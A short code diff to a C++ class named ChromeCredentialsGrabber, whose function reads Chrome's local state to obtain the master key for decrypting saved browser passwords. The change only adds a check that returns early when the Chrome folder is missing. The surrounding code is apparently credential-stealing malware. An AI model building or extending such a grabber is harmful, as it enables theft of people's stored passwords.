@@ -43,6 +43,11 @@ static std::tuple<Buffer, Buffer> parse_password(const Buffer& password)
 std::optional<Credentials> ChromeCredentialsGrabber::grab_credentials() const
 {
 	const std::filesystem::path chrome_root = get_local_chrome_path();
+	if (!exists(chrome_root))
+	{
+		return {};
+	}
+
 	const LocalState local_state = LocalState::from_chrome_root(chrome_root);
 	const auto aes_key = local_state.get_master_key();
 
